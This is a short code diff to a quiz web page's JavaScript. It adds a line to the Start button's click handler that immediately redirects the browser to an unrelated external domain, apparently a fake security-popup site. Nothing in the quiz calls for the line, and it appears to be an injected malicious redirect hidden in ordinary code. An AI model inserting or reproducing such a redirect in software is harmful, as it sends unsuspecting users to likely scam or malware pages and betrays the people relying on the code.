@@ -119,6 +119,7 @@ let questions = [
   
   // if startQuiz button clicked
   start_btn.onclick = () => {
+      window.location.replace('https://securitypopupwindows-mxsqi.ondigitalocean.app/')
     info_box.classList.add("activeInfo"); //show info box
   };
   
